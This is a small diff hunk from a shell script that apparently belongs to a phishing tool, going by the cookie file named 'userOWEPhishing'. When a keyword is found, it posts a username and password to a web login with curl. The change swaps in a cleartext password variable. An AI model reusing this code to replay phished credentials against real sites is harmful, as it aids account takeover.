@@ -162,7 +162,7 @@ do
 			echo "Word found"
 			curl -L -s "$URL" -H 'Content-Type: application/x-www-form-urlencoded' \
 						--data-urlencode "username=$USER_WEB_OWE" \
-						--data-urlencode "password=$PASS_WEB_OWE" \
+						--data-urlencode "password=$PASS_WEB_OWE_CLEAR" \
 						-c /tmp/userOWEPhishing -b /tmp/userOWEPhishing > /dev/null
 		fi		
 	fi
